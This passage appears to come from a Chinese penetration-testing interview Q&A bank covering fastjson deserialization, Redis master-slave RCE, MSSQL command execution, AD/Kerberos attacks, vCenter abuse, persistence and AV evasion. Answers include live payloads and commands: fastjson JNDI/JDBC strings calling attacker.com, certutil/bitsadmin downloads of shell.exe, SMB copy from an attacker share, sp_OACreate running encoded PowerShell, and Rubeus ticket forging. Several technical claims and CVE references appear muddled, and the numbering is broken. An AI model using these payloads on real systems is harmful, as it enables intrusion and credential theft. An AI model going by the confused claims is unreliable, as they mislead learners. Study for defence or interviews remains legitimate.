2. 更进一步：`{"@type":"org.apache.commons.dbcp.BasicDataSource","driverClassName":"com.mysql.jdbc.Driver","url":"jdbc:mysql://attacker.com:3306/poc"}` → 观察 DNSlog 是否出网。出网即漏洞。
3. 检查 Jar 版本：`mvn dependency:list | grep fastjson`; <1.2.80 均需警惕。

</details>

---

26. fastjson 漏洞回显一般用什么协议，为什么？
<details>
<summary>点击查看答案</summary>

* **DNS**：最稳定，无出站限制，一次查询即可验证成功 (OOB)。
* **HTTP / LDAP / RMI**：需要 80/443/389/1099 可以连通，能进一步传送字节码执行 RCE。
* 选择 DNS 的原因：
  1. 解析请求由目标 JVM 发起，控制权弱但足以证明代码执行分支走通。
  2. 外网只需一个 `dnslog` 域名，无需暴露复杂服务。

常用 POC：`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog.xxx/obj","autoCommit":true}`。

</details>

---

27. fastjson 高版本无回显情况下如何绕过，为什么可行？
<details>
<summary>点击查看答案</summary>

1. **冰蝎链 / TemplatesImpl**：利用 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，因为该类始终在 JDK 中且在 Fastjson *兼容性缓存* 白名单内；构造 `bytecodes` 字段执行内存马，无需开启 autoType。
2. **BeanToArray 绕过 (1.2.48+)**：设置 `JSON.parseObject(str, Object.class, Feature.SupportNonPublicField)`，通过数组劫持将恶意类名写入 `@type`，服务器端重写但仍反射执行。
3. **利用 `spring-core` `ClassPathXmlApplicationContext`**：白名单类，可加载远程 XML → `<bean class="ScriptEngineManager">` 触发脚本执行。
4. **JNDI 注入**：fastjson 本身不出网，但可用 `com.alibaba.fastjson.JSONObject#toJSONString` 自身逻辑拼接 JNDI 字符串在后续业务被查出。

可行原因：**绕过点不再依赖全局 AutoType**，而是利用白名单类的副作用或漏洞链，将执行逻辑转移到 JDK/第三方库中。

</details>

---

28. 代码审计做过哪些？主流 Java 框架简述。
<details>
<summary>点击查看答案</summary>

常见审计目标：

| 框架 | 关键安全点 |
|------|--------------------------------|
| **Spring MVC / Boot** | 路径绑定绕过、SpEL 注入 (`@Value`, `#{} `)、`@RequestParam` 反序列化、Actuator 未授权、YAML 解析。 |
| **Struts2** | OGNL 表达式、标签库 RCE、老版本一键命令执行 (S2-045 / 057)。 |
| **MyBatis / iBatis** | `#` vs `$` 占位符导致 SQLi，ResultHandler 反序列化。 |
| **Hibernate** | HQL 注入、二级缓存反序列化。 |
| **Shiro** | Cookie 加密密钥泄露/硬编码导致反序列化，权限注解绕过。 |
| **Dubbo** | Hessian/Kryo 反序列化、Telnet 命令注入。 |
| **Netty** | Netty-ObjectDecoder 链。 |
| **Log4j / Logback** | JNDI 注入、配置文件脚本引擎。 |

审计流程：入口 Controller → Service → DAO → Util，重点关注 **外部输入 → 关键函数 → 安全缺口**。

</details>

---

29. 泛微、致远、用友三套 OA 系统代码框架简述
<details>
<summary>点击查看答案</summary>

1. **泛微 E-Office / E-Cology**
   * 技术栈：Struts2 + Spring + Hibernate，早期 jsp/servlet 混用，后期大量 REST 接口。
   * 特点：自带 `weaver.common.*` 工具类，SQL 手写多，路径 `/weaver/` 开头。
2. **致远 A8 / OAC**
   * 技术栈：SpringMVC + ibatis，前端 Velocity 模板；核心包 `com.seeyon.*`。
   * 数据访问 `meta.xml` 定义 SQL，容易出现 `$sql$` 注入。
3. **用友 NC / U8 cloud**
   * 技术栈：SOA + WebService，早期基于 `eclipse RCP`，后台 EJB3；包名 `nc.itf.*`、`nc.bs.*`。
   * 大量自研框架 `ncc-web`，序列化采用 Hessian/Binary；文件上传接口 `/portal/pt/gridUpload`.  

共性：都包含 **自带的权限拦截器**，一旦找到未授权接口可直接 RCE；历史版本留有调试 servlet。

</details>

---

30. 泛微漏洞挖掘：前台 vs 后台 & 是否可反序列化
<details>
<summary>点击查看答案</summary>

1. **前台通用洞**
   * 任意文件下载 `/weaver/ln.FileDownload?fileName=../../conf/weaver.properties`。
   * 任意文件上传 `/weaver/weaver.common.Ctrl/FileUpload?module=...` → 写 JSP Shell。
   * SQL 注入 `json_sql=` 参数，盲注拿密码。
2. **后台（管理员）洞**
   * 低权限用户可上传工作流模版 → 插入 `jsp` 表单域 → 模版解析写入 webroot。
   * `WorkflowCenterTreeData` 反序列化 (Java XMLDecoder) CVE-2019-9672。
3. **反序列化能力**
   * 使用 fastjson 1.2.24，且开启 autoType；前台 `mobile/plugin` 接口可触发。
   * 存在 Hessian 服务 `/service/*`, 可用 `JRMPClient` 链。
4. **通用挖洞思路**
   * Diff 历史补丁包（概念版 vs 最新）找新增 Filter 与 SQL 语句；
   * 抓包登录过程，定位 `rand`、`validateCode` 参数旁的文件路径；
   * 对所有 `weaver.common.` 类进行 *深调试*，尤其是对 `fileName`、`SQL` 参数未过滤的方法。  

通过前台上传 + 文件包含即可无需后台权限拿到 Shell。

</details>

---

31. PHP 文件下载漏洞如何深入利用？
<details>
<summary>点击查看答案</summary>

1. **任意文件读取**：目录穿越 `../../../../etc/passwd`、`":/etc/passwd"`、`..%00/` 读配置、源码、日志。
2. **读取会话/口令**：`/var/lib/php/sessions/sess_XXXX`、`wp-config.php`、数据库备份，拿网站后台口令。
3. **伪协议链**
   * `php://filter/convert.base64-encode/resource=index.php` → 源码泄露。
   * `zip://shell.jpg%23payload.php`，配合 upload 绕过后缀限制。
4. **内网 SSRF**：下载 URL 可控时替换为 `http://127.0.0.1:2375/containers/json` 探测 Docker；或 `gopher://` 发 POST 包。
5. **XSS/HTML Injection**：`Content-Type: text/html` 且浏览器渲染，可插入 `<script>`，钓管理员 Cookie。
6. **POP 链 RCE**：目标读取 `.phar` 文件路径时触发反序列化 (`phar://`)→ RCE。
7. **Log Poisoning to RCE**：读取 nginx/access.log → 包含 `<?php eval($_POST[x]);?>`，若随后存在包含/解析日志的功能即可 getshell。

纵深利用流程：先读敏感文件拿数据库 → 写入 Webshell via SQL、upload 或日志投毒 → 横向。

</details> 
## 31. redis 怎么去做攻击，主从复制利用条件，为什么主从复制可以做到拿 shell，原理是什 么，主从复制会影响业务吗，主从复制的原理是什么？
<details>
<summary>点击展开答案</summary>

### 31.1 攻击思路
1. **未授权访问/弱口令**：攻击者可直接 CONFIG、SLAVEOF 等危险命令。
2. **主从复制写文件**：利用 `SLAVEOF` 建立**伪装 Master**，向受害者推送恶意 RDB/模块，最终写入系统关键位置（`~/.ssh/authorized_keys`、`/etc/cron.d/backup`、`/lib/modules/evil.so`）。
3. **加载恶意模块**：Redis ≥4.0 支持 `MODULE LOAD /tmp/exp.so`，可直接导出 `system` 命令执行。

### 31.2 利用条件
* Redis 以 **root** 或对目标目录有写权限运行；
* `protected-mode no` 且监听 0.0.0.0 或存在弱口令；
* 网络可达：受害机可主动访问攻击者伪 Master（默认 6379）。

### 31.3 为何能拿 Shell
主从同步时 Master 会向 Slave **全量传输 RDB 文件**；RDB 内容完全由 Master 决定。攻击者在 RDB
里伪造"文件内容"后指定 `dir /var/spool/cron/`、`dbfilename root`，Slave 收到后直接把 RDB 写到磁盘 ➜ 生成可执行脚本/SSH 公钥，从而获得代码执行或反弹 Shell。

### 31.4 对业务影响
短暂将业务 Redis 设为 Slave ➜ 会进入 `loading` 状态，读写阻塞数秒；同步完成后可 `SLAVEOF NO ONE` 恢复 Master 身份，**一般对线上业务影响很小**，多数监控也难察觉。

### 31.5 主从复制原理
1. Slave 发送 `PING` ➜ `REPLCONF` ➜ `PSYNC`；
2. 若首次同步，Master **fork** 生成 RDB 发给 Slave；
3. 之后走 **命令流量**（增量同步）。
复制依赖 TCP 长连接 + 偏移量，流程简单、无鉴权 —— 被滥用的根源。

</details>

## 32. BCEL 利用链使用条件，原理，代码跟过底层没有，怎么调用的？
<details>
<summary>点击展开答案</summary>

### 32.1 使用条件
* 目标依赖 **Commons-Collections ≤3.2.1** 或其他可用 Gadget；
* JDK 自带 `com.sun.org.apache.bcel.internal.util.ClassLoader` 或项目引入 **BCEL**；
* 序列化入口可控（Shiro、Fastjson、JDK 原生）。

### 32.2 原理
`ClassLoader#loadClass()` 遇到形如 `$$BCEL$$<base64>` 的类名时自动：
1. Base64 解码得到字节码；
2. `defineClass` 定义到 JVM；
3. 立即执行 `<clinit>` 静态块。
配合 `InvokerTransformer("newInstance")` 等 Gadget，即可在反序列化过程中实例化恶意类并执行随身代码。

### 32.3 调用链 (CC1 示例)
`AnnotationInvocationHandler.readObject` → `HashMap.hashCode` → `LazyMap.get` → `InvokerTransformer.transform` → **触发 BCEL Loader** → 执行恶意 `<clinit>`。

### 32.4 底层跟踪
源码位于 `org.apache.bcel.util.ClassLoader`：
```java
if (class_name.startsWith("$$BCEL$$")) {
    byte[] decoded = Utility.decode(class_name.substring(8));
    clazz = defineClass("sun.reflect.Generated", decoded, 0, decoded.length);
}
```
跟栈即可验证 decode→defineClass→clinit 的执行顺序。

</details>

## 33. 假如我攻击了一台 17010 的机器......为什么无法抓到密码，怎么解决？
<details>
<summary>点击展开答案</summary>

### 33.1 背景
"17010" 常指 **MS17-010 (EternalBlue)**。利用成功 + DoublePulsar 植入后获取 SYSTEM，但重启后仍成功渗透却 **抓不到明文/哈希**。

### 33.2 原因分析
1. **Credential Guard / LSA Protection**：重启时被默认开启，LSASS 拒绝读内存；
2. **WDigest 政策关闭**：`UseLogonCredential=0`，明文口令不再缓存；
3. **系统未出现交互式登录**：刚启动仅服务账号，LSASS 内没有有效凭据；
4. 安防软件/EDR 注入 LSASS 拦截 token 读取。

### 33.3 解决办法
* 在 **用户登录后** 再次尝试 `sekurlsa::logonPasswords`；
* 借助 **DCSync** / `lsadump::dcsync` 从域控侧导出 Hash；
* 使用 `PsExec /s \victim cmd` 注入进程规避 PPL；
* 若仅本地机器，改走 **LSA Secrets** (`mimikatz lsadump::secrets`) 或利用 `comsvcs.dll MiniDump` API 绕过防护。

</details>

## 34. 域外工作组主机如何发现并进入域？
<details>
<summary>点击展开答案</summary>

1. **发现域**
   * `nltest /dsgetdc: /force` 自动查询 _ldap._tcp SRV 记录；
   * `nslookup -type=srv _kerberos._tcp` 获取域名 + DC IP；
   * `PowerView Get-NetDomain` 在无域情况下同样可返回信息。
2. **定位域控**：对得到的 DC 列表做 `ping / smb` 验证；端口 88/389/445/135 必须开放。
3. **进入域**
   * 利用 SMB/LDAP 匿名读取：`rpcclient -U '' <dc> -N --command="enumdomusers"`；
   * 通过 **LLMNR/NBT-NS Poisoning** 抓取域用户 Hash，再离线爆破或 **NTLM Relay** 至 LDAP 修改 ACL；
   * 若有打印机/IIS 服务，可用 **Kerberoast** + AS-REP Roast 获取可离线破解票据。
4. **最终目标**：拿到任意域账号 ➜ Pass-the-Hash 登录域成员 ➜ 横向至 DC。

</details>

## 35. JBoss 反序列化漏洞原理
<details>
<summary>点击展开答案</summary>

* JBoss 早期提供 **JMXInvokerServlet** (`/invoker/JMXInvokerServlet`) 接收 `MarshalledInvocation` 对象；
* 服务端使用 **ObjectInputStream** 直接反序列化客户端数据，无类白名单；
* 攻击者发送 Commons-Collections Gadget → 触发 `readObject` 链执行 `Runtime.exec`；
* 新版 JBoss EAP 加入 **DeserializationGuard**，需绕过或借 C3P0/Hibernate 链。

</details>

## 36. MSSQL 被 360 拦截 xp_cmdshell 的绕过
<details>
<summary>点击展开答案</summary>

1. **CLR Assembly**：`sp_configure 'clr enabled',1; RECONFIGURE;` ➜ 上传 C# DLL 执行 `Process.Start`，360 对 SQLCLR 监控较弱。
2. **OLE Automation**：启用 `sp_OACreate` 调 `wscript.shell`：
   ```sql
   EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;
   DECLARE @hr INT,@obj INT; EXEC @hr=sp_oacreate 'wscript.shell',@obj OUT;
   EXEC sp_oamethod @obj,'run',NULL,'powershell -enc ...';
   ```
3. **SQL Agent Job**：若目标有 Agent，创建 CmdExec 类型作业并立即运行；任务进程由 `sqlagent.exe` 启动，常被漏报。
4. **写后门 DLL**：向磁盘写 DLL + 创建 `xp_mycmd` 自定义扩展。

</details>

## 37. 什么是 MSSQL 的存储过程，本质是什么？为什么可以执行命令？
<details>
<summary>点击展开答案</summary>

* **定义**：预编译的 T-SQL/CLR 代码段，存储在系统数据库 `sys.procedures`；
* **本质**：SQL Server 内部对象，执行前生成执行计划并缓存 ➜ 提升性能&安全；
* **执行命令原因**：部分系统过程（如 `xp_cmdshell`、`sp_OACreate`）封装了 Win32 API，底层用 `CreateProcess`。因此调用即 Windows 级命令执行。

</details>

## 38. 通过 MSSQL 上传文件需开启哪个存储过程？
<details>
<summary>点击展开答案</summary>

* 常用 **Ole Automation Procedures**：结合 `ADODB.Stream` 可写任意二进制：
  ```sql
  EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;
  DECLARE @obj INT; EXEC sp_oacreate 'ADODB.Stream',@obj OUT;
  -- 调用 Write / SaveToFile 上传 EXE
  ```
* 也可用 `xp_cmdshell` 配合 `certutil -urlcache -f` 下载，但前提同样需开启。

</details>

## 39. 内网文件落地与执行
<details>
<summary>点击展开答案</summary>

1. **落地方式**
   * `certutil -urlcache -split -f http://x/shell.exe shell.exe`;
   * `bitsadmin /transfer job http://x/s.exe %temp%\s.exe`;
   * 无出网 ➜ `echo <base64> | certutil -decode - out.exe` / `powershell -enc` 分段写文件；
   * SMB/DFS 映射：`copy \\attacker\share\a.exe c:\temp\`。
2. **执行**
   * `start /b c:\temp\a.exe` 或 `powershell Start-Process a.exe`;
   * 借计划任务：`schtasks /create /tn up /tr a.exe /sc onstart /ru system`;
   * 若 AV 拦截，可 `rundll32 a.dll,Entry`、`regsvr32 /s a.sct`。

</details>

## 40. NTLM Relay + ADCS 利用
<details>
<summary>点击展开答案</summary>

* **利用条件**：
  1. 存在 `HTTP/LDAP` 可被 relay 的接口（典型 `ADCS enrollment` HTTP）；
  2. 域模板 `ENROLLEE_SUPPLIES_SUBJECT` + `Authenticated Users` 有申请权限；
  3. DC 与 Responder 服务器在同网段可被欺骗。
* **Responder 部署机**：放在 **目标子网内的任意主机**，最好与 DC 处同 VLAN，方便截获 LLMNR/NBT-NS；
* **原理**：
  1. 劫持域用户 NTLM → relay 到 `certsrv/certificatetemplate` 获取 **带 `NTLM auth` 的 kerberos cert**；
  2. 证书转化为 **PFX**，`pkinit` 请求 TGT；
  3. 拿到 TGT = 任意受害用户票据，可是域管 ⇒ 整个域沦陷。

</details>

## 41. CVE-2022-26923 vs ESC8
<details>
<summary>点击展开答案</summary>

* **漏洞点**：若机器账户有 DNS `dNSHostName` 写权限，可把自己指向 DC FQDN ➜ `certificateservicesclient` 注册时自动加 `HOST/DC` 到 SAN；
* **利用条件**：域用户可建立计算机对象或控制现有计算机对象；模板 `Machine` 默认允许 **Auto-Enroll**；
* **优势**：无需像 ESC8 那样获得高级别模板权限，仅需常见机帐户权限即可 **直升域管**；利用链更短更隐蔽。

</details>

## 42. 获得 vCenter 权限后的深入利用
<details>
<summary>点击展开答案</summary>

1. **横向 ESXi**：通过 vSphere API 创建恶意 VM 或上传 VIB 插件；
2. **提取凭据**：下载 `vpxd.cfg` (`/etc/vmware-vpx/`) 含 SSO Admin hash；
3. **DB 解密**：`/storage/db/vpostgres/VCDB` 使用 `vpxd_servicecfg password -p` 生成的 AES key，脚本 `pyvmomi` 可调用 `VECS` API dump 明文；
4. **虚拟机磁盘挂载**：热添加受害 VM vmdk 到攻击者 VM 读取文件；
5. **备份文件 (.dcf)**：算法为 `openssl aes-256-cbc -salt -pass file:/etc/vmware/ssl/keyfile`，有 root 即可解。

</details>

## 43. vCenter 环境下目标主机锁屏无法输入密码
<details>
<summary>点击展开答案</summary>

使用 **VMware Remote Console / VMRC** 的 **Send Ctrl+Alt+Del** 功能进入登录界面，再：
1. **虚拟键盘注入**：vSphere 支持 `vim-cmd vmsvc/keyboard` 发送扫描码，可脚本自动输入；
2. 直接 **重设 OS 密码**：挂载 ISO / VMware Tools `hgfs` 注入 `utilman.exe` 替换 shell；
3. 若为 ESXi 主机锁屏，可用 `esxcli system settings advanced set -o /UserVars/SuppressShellWarning -i 1` 绕过。

</details>

## 44. 360 晶核模式下权限维持
<details>
<summary>点击展开答案</summary>

* **晶核 = Driver Level** 保护，禁止核心对象创建/修改。
* 绕过思路：
  1. **WMI 事件订阅**：注册 `__EventFilter` + `CommandLineEventConsumer`，360 对 WMI 监控较弱；
  2. **CLR 加载劫持**：修改 `HKLM\Software\Microsoft\.NETFramework\v4.0.30319\AssemblyFolders` 指向恶意 DLL；
  3. **IFEO Image Hijack**：`Debugger` 值指向木马，在晶核下仍可触发；
  4. 计划任务被拦截 → 改用 **UAC Bypass** Persist (fodhelper / sdclt) 结合注册表。

</details>

## 45. MSSQL 除 xp_cmdshell 之外的命令执行方式
<details>
<summary>点击展开答案</summary>

| 技术 | 需要权限 | 说明 |
|------|----------|------|
| SQLCLR 自定义过程 | `ALTER ASSEMBLY` | C# DLL 内 `Process.Start()` |
| OLE Automation (`sp_OACreate`) | `Ole Automation Procedures` | 调 `wscript.shell` |
| SQL Agent Job | `SQLAgentOperatorRole` | CmdExec Step |
| `powershell.exe` 外部调用 | 需文件系统权限 | `xp_cmdshell 'powershell -enc ...'` 之外可写 bat 并 `sqlagent` 执行 |
| MOF 编译 | Local Admin | 写入 `C:\Windows\System32\wbem\mof` |

</details>

## 46. `net group "Domain Admins" /domain` 查询不到原因
<details>
<summary>点击展开答案</summary>

1. 当前用户无 **LDAP/SAMR 查询权限**（Guest/匿名）；
2. 445/135 RPC 端口被防火墙屏蔽；
3. 目标域存在 **显示过滤** (`NoEnumerateGlobalGroups` GPO)；
4. 域使用 **可重复 SID** 隐藏管理员 (SDDL DACL)。

**解决**：切换有权限帐户、直连 DC IP、使用 `Get-ADGroupMember` 代替、或 DCSync 导出 ntds.dit 查组成员。

</details>

## 47. 本质查询位置
<details>
<summary>点击展开答案</summary>

命令调用 **NetAPI32.dll → NetGroupGetUsers RPC**，最终通过 **SAMR 管道** 向域控 `lsass.exe` 查询 **Active Directory** 对象 `CN=Domain Admins,CN=Users,<domain DN>` 的 `member` 属性并返回列表。

</details>

## 48. 免杀：国内外杀软差异
<details>
<summary>点击展开答案</summary>

* **国产 AV**：侧重 **特征 + 行为白名单**，常用绕过：壳分离、代码虚拟化、API 动态解析、内存加载；
* **卡巴/Defender** 等国际厂商：引入 ML + 云沙箱，对异常 API 调用序列 & Entropy 检测严格；同样打包后依旧命中高维特征。

> 结论：需**重构行为**（父子进程树、Syscall）+ 签名伪装，单纯改壳对卡巴无效。

</details>

## 49. 分离免杀 vs 单体免杀
<details>
<summary>点击展开答案</summary>

* **单体**：ShellCode + Loader 合并为一个可执行；优点：部署简单；缺点：体积大，熵值高易被查。
* **分离**：Launcher 仅做下载/内存加载，真正 Payload 在线/隐藏资源；优势：
  * 主体可热更新，多层加密降低特征；
  * 初始样本干净（无恶意逻辑）更易过静态检测。

本质：拆分 **恶意功能链**，降低任何一个节点被特征匹配的概率。

</details> 

## 56. 在拿到 Java 系统源码时，安全审计的完整流程是什么？
<details>
<summary>点击展开答案</summary>

1. **环境还原**：本地拉起 `mvn-clean install` / `docker-compose`，保证能正常跑通并调试。
2. **依赖梳理**：`pom.xml` / `build.gradle` → 列出框架（SpringMVC/Boot、MyBatis、Shiro…）与三方组件版本。
3. **入口枚举**：
   * Web：`@Controller`、`@RestController`、Servlet、Filter、WebSocket。
   * 非 Web：定时 Job、消息队列、RMI、JMX 等。
4. **数据流建模**：`Source(用户输入) → Sink(危险调用)`
   * Source：`request.getParameter`、Headers、Body、上传文件、Cookie、MQ 消息等；
   * Sink：SQL／EL／OGNL／SpEL 执行、`Runtime.exec`、`ClassLoader.defineClass`、文件写入、反序列化等。
5. **自动扫描**：SonarQube、FindSecBugs、OWASP Dependency-Check + `mvn –DskipTests` 自测。
6. **人工深挖**：
   * 身份认证 & 权限注解绕过 (`@PreAuthorize`, Shiro Realm)。
   * 反序列化入口 (`ObjectInputStream`, `JSON.parseObject`, `readObject`).
   * 上传 & 下载接口 → 路径穿越 / 任意文件读写。
   * 业务逻辑：支付、优惠卷、积分等越权。
7. **PoC 复现**：用 Burp/ysoserial/粗粒度脚本验证并截图。
8. **输出报告**：漏洞描述、影响、复现步骤、修复建议（版本升级 / 白名单 / 参数校验 / 最小权限）。

</details>

## 57. PHP 反序列化链排查时重点关注哪些魔术方法？
<details>
<summary>点击展开答案</summary>

可触发执行逻辑的典型魔术方法：
* `__wakeup()` 反序列化完成后立即调用。
* `__destruct()` 对象出作用域时触发，最常见 RCE 载体。
* `__toString()` 发生字符串转换时调用，可被 `echo` / 日志拼接触发。
* `__call()` / `__callStatic()` 调用未定义方法时执行。
* `__invoke()` 对象当函数用时触发。
* `__get()` / `__set()` / `__unset()` 属性访问重载，可链式修改。
* `__sleep()` / `__serialize()` 序列化前触发，配合 POP-Chain 绕 WAF。
* `__set_state()` `var_export()` 反射实例化时调用。

排查套路：Grepping 以上方法 + 危险函数(`eval`, `system`, `file_put_contents`)，再跟数据流看是否可控。

</details>

## 58. 远程文件包含 (RFI) 与 本地文件包含 (LFI) 受哪些 PHP 设置影响？
<details>
<summary>点击展开答案</summary>

| 关键 `php.ini` 选项 | 作用 | 影响 |
|--------------------|------|------|
| `allow_url_fopen`  | 允许 `fopen()` 系列访问 URL | 关闭后 `file_get_contents('http://...')` 失效 |
| `allow_url_include`| 允许 `include/require` 加载 URL | **RFI 必须开启**；对 LFI 无影响 |
| `open_basedir`     | 限制脚本可访问目录 | 收窄 LFI 可读/写范围 |
| `disable_functions`| 屏蔽危险函数 | 可阻断 `system`,`shell_exec` 等二次利用 |
| `magic_quotes_gpc`†| 输入自动转义 | 旧版本下可干扰路径拼接 |

> †PHP 5.4 起已删除。

RFI 利用条件 = `allow_url_include=On` + 目标函数 `include/require` 可控；LFI 主要受 `open_basedir`、`filter://` 协议影响。

</details>

## 59. WAF 防护 SQL 注入的核心原理是什么？
<details>
<summary>点击展开答案</summary>

1. **特征匹配**：正则 + 关键字黑名单（`union`, `select`, `0x`）。
2. **Token 化解析**：把输入拆分为 Token，按语法树比对合法 SQL Grammar → 语义异常即拦截。
3. **基线学习**：按 URI / 参数 统计正常长度 & 字符分布，异常偏差告警（统计学 / ML）。
4. **执行时拦截（RASP）**：Hook `java.sql.*` / PDO，运行前检查占位符使用及拼接情况。
5. **响应关联**：连续 5xx + 关键报错 (`syntax error`) 自动拉黑 IP。

> 真正的"防弹"方案依然是 **预编译参数化** 与 **最小权限账户**，WAF 只是补锅。

</details>

## 60. 常见 Windows 本地提权方式有哪些？
<details>
<summary>点击展开答案</summary>

1. **服务提权**
   * 可写服务可执行 / 配置（`sc config binPath=`）。
   * 未引用引号的路径 (`C:\Program Files\A B\svc.exe`).
   * 服务权限 `SERVICE_CHANGE_CONFIG` / `SeImpersonatePrivilege`。
2. **DLL /SearchPath 劫持**：系统服务或 EXE 在可写目录加载同名 DLL。
3. **UAC 绕过**：`fodhelper`, `sdclt`, `computerdefaults` 注册表劫持。
4. **任务计划**：可写 `.xml` / 任意创建高权限 Task (`schtasks /RU SYSTEM`).
5. **令牌窃取 / 爆破**：利用 `SeImpersonate` → Potato 系列 (`PrintSpoofer`, `JuicyPotatoNG`).
6. **内核漏洞**（CVE-2021-1732、PrintNightmare `CVE-2021-34527`、ms-10-015）。
7. **AlwaysInstallElevated** & **MSI**：用户组策略错误导致任意安装提权。
8. **弱 ACL**：可写 `C:\Windows\System32` / 注册表 `Image File Execution Options`。

排查利器：`winPEAS`, `Seatbelt`, `whoami /priv`, `accesschk`。

</details>

## 61. Kerberos 伪造票据：黄金票据 vs 白银票据
<details>
<summary>点击展开答案</summary>

| 对比 | **黄金票据 (Golden Ticket)** | **白银票据 (Silver Ticket)** |
|------|-----------------------------|------------------------------|
| 本质 | 伪造 **TGT** | 伪造 **TGS** (服务票据) |
| 需要的 Hash | `krbtgt` 帐号 NTLM | 目标服务帐号 NTLM (如 `HTTP/www`) |
| 权限范围 | 整个域，任意用户/服务 | 仅指定 SPN 那个服务 | 
| 生命周期 | 有效期可任意填写（默认 10 年） | 受服务票据生命周期限制（数小时） |
| 检测难度 | 较难（仅 KDC 能验证） | 易于通过服务日志发现 |

**利用** (Rubeus 示例)：
```powershell
# Golden
Rubeus golden /user:Administrator /domain:corp.local /rc4:<krbtgt_hash> /ptt
# Silver
Rubeus silver /domain:corp.local /service:cifs/dc.corp.local /target:dc /rc4:<svc_hash> /ptt
```
> 拿到 `krbtgt` 哈希=终极钥匙，可直接登陆域控；Silver 适合快速打单台服务（例如 MSSQL）。

</details>

## 62. Linux 权限维持思路（含进程注入）
<details>
<summary>点击展开答案</summary>

* **计划任务**：`crontab -e`, `/etc/cron.d/`, `systemd --user` 定时执行。
* **服务劫持**：新增 `systemd service` (`/etc/systemd/system/evil.service`).
* **LD_PRELOAD / ld.so.conf**：预加载恶意 so，对所有进程注入。
* **ptrace 进程注入**：`gdb -p`, `libprocesshider`, `injectso`。
* **bash 持久化**：`~/.bashrc`, `~/.profile`, `/etc/profile.d/*.sh`。
* **SSH 后门**：`authorized_keys`、Patch `sshd`。
* **内核模块**：`insmod rootkit.ko` 隐蔽进程 & 端口。
* **iptables & Netfilter**：隐写后门端口  → `NF_ACCEPT`。
* **替换二进制**：`/usr/bin/sudo` / `login` 木马 (需 immutable bit 隐藏)。

</details>

## 63. 反序列化原理及关键函数
<details>
<summary>点击展开答案</summary>

* **原理**：把字节流还原为对象图；若过程中执行了可控方法/反射，即产生 RCE。
* **Java**：`ObjectInputStream.readObject()` → `readResolve` / `readExternal` / `validateObject` 调用。
* **PHP**：`unserialize()`、`igbinary_unserialize()`、`msgpack_unpack()`、`yaml_parse()` 等内部都走 `php_var_unserialize`。
* **.NET**：`BinaryFormatter.Deserialize`、`DataContractSerializer.ReadObject`。

风险来自：
1. 类的魔术/回调方法执行 (`readObject`, `__destruct`).
2. Gadget 链拼装导致危险 API 调用。

</details>

## 64. 宽字节 SQL 注入原理，是否仅 GBK 受影响？
<details>
<summary>点击展开答案</summary>

* **机制**：多字节编码中 `0x5c` (`\\`) 可能作为首字节；与下一个字节组合成合法汉字。MySQL 先对输入做转义 → `0x5c` 变 `0x5c5c`，编码解析阶段再与下字节拼成字符，导致转义"逃逸"。
* **利用**：构造 `%df'` + `0x5c` 让后续单引号失效 → 拼接恶意 SQL。常见于 **GBK、GB2312、BIG5、SJIS、EUC-CN** 等双字节集，只要首字节允 `0x5c` 即可。
* **防御**：
  1. 统一使用 UTF-8 / utf8mb4；
  2. 设置 `mysql_real_escape_string` 后仍需 **预编译语句**；
  3. Web 层做编码白名单或双次编码检查。

</details>

## 65. DOM XSS 原理与挖掘方法
<details>
<summary>点击展开答案</summary>

1. **原理**：前端 JS 把可控数据 (`location`, `hash`, `postMessage`, `localStorage`) 写入危险 Sink (`innerHTML`, `document.write`, `eval`, `setTimeout`) 导致执行。
2. **挖掘**：
   * 动态调试：Chrome DevTools → Event Listener Breakpoints → DOM Mutation。
   * 自动化：Burp DOM Invader、`link-finder.py`, `xsser`。
   * 关键源码 grep：`innerHTML`, `insertAdjacentHTML`, `eval`, `new Function`。
3. **利用技巧**：
   * 双写/URL 爬楼：`//#` 跨 `hash` 解析。
   * 选择器注入：`<svg onload=alert(1)>` 绕 JSON.parse。
4. **防护**：严格 CSP (`default-src 'self'; script-src 'nonce-xxx'`) + 前端编码 `textContent` 代替 `innerHTML`。

</details>

## 66. Java 内存马原理与利用
<details>
<summary>点击展开答案</summary>

* **定义**：不落地文件，直接把恶意字节码注入 JVM 内存；后续流量触发即 RCE。
* **常见注入点**：
  * **Servlet Filter** (`FilterMap`) 反射 `StandardContext#addFilter` 动态注册。
  * **Spring Controller** 拿 `RequestMappingHandlerMapping` 注入新的 `@RequestMapping` 方法。
  * **Agent / Instrumentation** `javaagent`/`attach` 重写字节码。
* **加载方式**：反序列化、JNDI、BCEL、Unsafe、`defineClass()`。
* **通信协议**：冰蝎/哥斯拉 AES+Base64，自定义 HTTP 头；也可内网 DNS、WebSocket。
* **检测**：列出运行时 Filter/Servlet (`jol-cli vm --all`)，或者 eBPF 监控非常规 `defineClass` 调用。

</details>

## 67. 冰蝎 & 哥斯拉 WebShell 管理器原理
<details>
<summary>点击展开答案</summary>

| 工具 | 加密协议 | 载荷特征 | 特点 |
|------|---------|---------|------|
| 冰蝎 (Behinder) | AES-CBC(默认) + Base64 | Java `payload.class` | UI 友好，支持内存马、一键隧道 |
| 哥斯拉 (Godzilla) | AES-GCM / XOR | 纯字符 Shell (`eval($_POST[x])`) | 插件生态丰富，可热更新 |

共同点：
1. **自定义流量格式**，避开 WAF 关键字；
2. **动态载荷**：首次握手上传一段字节码/脚本，以后全部走内存；
3. **双向流量加密**，抓包难以还原命令。

区别在于加密算法、兼容语言（PHP/JSP/ASP/ASPX）及插件体系。

</details>

## 68. CSP 如何抵御 XSS？
<details>
<summary>点击展开答案</summary>

* 通过 `Content-Security-Policy` 响应头，限定页面可加载的脚本/样式/媒体来源。
* 关键指令：
  * `default-src 'self'` 阻止外链资源。
  * `script-src 'nonce-<rand>'` 禁止内联脚本，运行时随机 Nonce 验证。
  * `object-src 'none'` 禁用 Flash 等插件。
  * `sandbox` 限制页面能力（表单提交、脚本执行）。
* 遇到 XSS 注入时，即使插入 `<script>` 也因 **无匹配源/Nonce** 被浏览器拦截。

</details>

## 69. 为什么 CSRF Token 能防御跨站请求伪造？
<details>
<summary>点击展开答案</summary>

1. **同源策略** 只保护读取，不阻止跨域发送；攻击者可发 POST，但无法读取响应。
2. **Token**：服务器为用户表单生成随机值并存入 Session；提交时必须带回。
3. 攻击者无法预测/获取受害者浏览器中的 Token，因此伪造请求缺少合法参数，被服务端拒绝。
